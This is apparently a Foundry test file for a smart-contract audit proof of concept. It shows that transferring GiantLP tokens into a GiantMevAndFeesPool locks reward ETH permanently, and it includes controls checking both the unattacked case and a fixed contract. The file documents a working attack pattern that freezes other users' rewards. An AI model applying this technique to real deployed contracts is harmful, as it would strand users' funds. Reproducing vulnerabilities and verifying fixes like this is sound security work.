// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    GiantLP,
    GiantLPFixed,
    GiantMevAndFeesPool,
    GiantMevAndFeesPoolFixed,
    GiantMevAndFeesPoolBase,
    MiniToken,
    LPHolder
} from "./43026-h-02-rewards-of-giantmevandfeespool-can-be-locked-for-all-us.sol";

contract GiantMevRewardLockTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant VICTIM_LP = 60 ether;
    uint256 internal constant ATTACKER_LP = 40 ether;
    uint256 internal constant REWARDS = 100 ether;

    // ── EXPLOIT: transferring GiantLP into the pool permanently locks reward ETH ──
    function test_exploit_selfHeldLP_locksRewardsForever() public {
        Exploit e = new Exploit();
        vm.deal(address(e), REWARDS); // fund the exploit so it can seed the reward pool
        e.run();

        // The honest victim received exactly its fair 60% share (60e18) ...
        assertEq(e.victimReceived(), 60 ether, "victim claimed its fair share");
        // ... the attacker, having dumped its LP into the pool, recovers nothing ...
        assertEq(e.attackerReceived(), 0, "attacker self-locked its own share");

        // ... and 40e18 of reward ETH is permanently stuck in the pool: it belongs
        // to the pool's phantom self-held LP share, and NO code path can ever pay
        // it out to a real user. This is the frozen-funds harm.
        assertEq(e.lockedAmount(), 40 ether, "reward ETH permanently locked in pool");
        assertEq(address(e.poolAddr()).balance, 40 ether, "pool still holds the locked ETH");

        // The LOCKED-ETH marker at the SINK records the harmed magnitude.
        MiniToken marker = MiniToken(e.markerAddr());
        assertEq(marker.balanceOf(SINK), 40 ether, "marker records locked amount at SINK");

        // The pool self-holds the attacker's transferred LP (proof of the self-hold).
        GiantLP lp = GiantLP(e.lpAddr());
        assertEq(lp.balanceOf(e.poolAddr()), ATTACKER_LP, "pool self-holds LP");
        assertEq(lp.totalSupply(), VICTIM_LP + ATTACKER_LP, "totalSupply unchanged by the transfer");

        // Honest claimable strictly decreased vs an unattacked pool: only 60e18 of
        // the 100e18 rewards ever reached honest LPs.
        assertLt(e.victimReceived() + e.attackerReceived(), REWARDS, "less than full rewards reached honest LPs");
    }

    // ── NEGATIVE CONTROL 1: same vulnerable code, NO malicious transfer -> nothing locked ──
    function test_control_noMaliciousTransfer_nothingLocked() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();
        LPHolder victim = new LPHolder();
        LPHolder attacker = new LPHolder();

        pool.depositMintLP(address(victim), VICTIM_LP);
        pool.depositMintLP(address(attacker), ATTACKER_LP);

        // No attack: attacker simply keeps its LP.
        vm.deal(address(this), REWARDS);
        (bool ok, ) = payable(address(pool)).call{value: REWARDS}("");
        require(ok, "seed");

        victim.doClaim(pool);
        attacker.doClaim(pool);

        // Both honest LPs claim their full share; the pool ends empty. No lock.
        assertEq(address(victim).balance, 60 ether, "victim full share");
        assertEq(address(attacker).balance, 40 ether, "attacker full share");
        assertEq(address(pool).balance, 0, "no ETH locked without the malicious transfer");
    }

    // ── NEGATIVE CONTROL 2: recommended fix (GiantLPFixed) blocks the self-hold ──
    function test_control_fixedLP_blocksSelfHold() public {
        GiantMevAndFeesPoolFixed pool = new GiantMevAndFeesPoolFixed();
        GiantLP lp = pool.lpTokenETH();
        LPHolder attacker = new LPHolder();

        pool.depositMintLP(address(attacker), ATTACKER_LP);

        // The malicious transfer into the pool now reverts -> the pool can never
        // become a self-shareholder, so no reward ETH can be locked this way.
        vm.expectRevert(bytes("GiantLP: cannot transfer to pool"));
        attacker.doTransfer(lp, address(pool), ATTACKER_LP);

        assertEq(lp.balanceOf(address(pool)), 0, "fixed pool never self-holds LP");
        assertEq(lp.balanceOf(address(attacker)), ATTACKER_LP, "attacker keeps its LP");
    }
}
